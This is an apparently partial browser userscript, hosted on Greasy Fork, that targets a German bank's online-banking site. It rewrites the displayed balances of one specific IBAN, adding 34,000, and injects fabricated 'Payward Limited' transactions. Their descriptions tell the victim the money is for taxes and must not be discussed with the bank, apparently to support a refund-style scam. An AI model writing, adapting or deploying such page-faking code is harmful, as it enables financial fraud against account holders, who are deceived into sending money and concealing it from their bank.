// ==UserScript==
// @name         Volks combined Franz Sturmlechner
...
// @match        https://www.muenchner-bank.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/481470/Volks%20combined%20Franz%20Sturmlechner.user.js
// @updateURL https://update.greasyfork.org/scripts/481470/Volks%20combined%20Franz%20Sturmlechner.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  34000 },
        { index: 1, adjustmentAmount: 34000 },
        { index: 2, adjustmentAmount: 34000 }
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE95 7019 0000";
    var targetTextContent2 = " 0000 0542 16";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 34000.0; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
    ...
    const TEXT_CONTENT_TO_CHECK = 'DE95 7019 0000 0000 0542 16';
    ...
    const TRANSACTIONS = [
        ...
        },
        {
            ...
            description: 'Geld für Steuern. Mit Bank nicht besprechen, damit nicht gesperrt',
            amount: '17.000,00',
            date: '6. Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
...
{
            title: 'Payward Limited',
            description: 'Back up. Geld für Steuern. Mit Bank nicht besprechen, damit nicht gesperrt',
            amount: '10.000,00',
            date: '8. Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 0, // Number of steps to move the transaction
...
{
            title: 'Payward Limited',
            description: '2 Back up. Geld für Steuern. Mit Bank nicht besprechen, damit nicht gesperrt',
            amount: '7.000,00',
            date: '8. Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 0, // Number of steps to move the transaction
